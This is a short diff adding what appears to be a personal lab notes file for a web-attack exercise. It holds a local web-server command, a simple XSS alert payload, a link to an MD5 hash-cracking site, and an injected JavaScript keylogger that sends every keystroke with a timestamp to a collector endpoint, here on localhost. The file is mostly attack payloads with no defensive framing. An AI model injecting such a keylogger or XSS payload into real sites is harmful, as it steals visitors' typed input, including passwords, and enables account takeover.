@@ -1,0 +1,17 @@
+python -m http.server 8000
+
+http://localhost:8000/
+
+<script>alert('XSS Attack!');</script>
+
+https://md5decrypt.net/en/
+
+<script>
+document.addEventListener('keydown', function(e) {
+  fetch('http://127.0.0.1:5000/keylogger', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ key: e.key, timestamp: new Date().toISOString() })
+  });
+});
+</script>
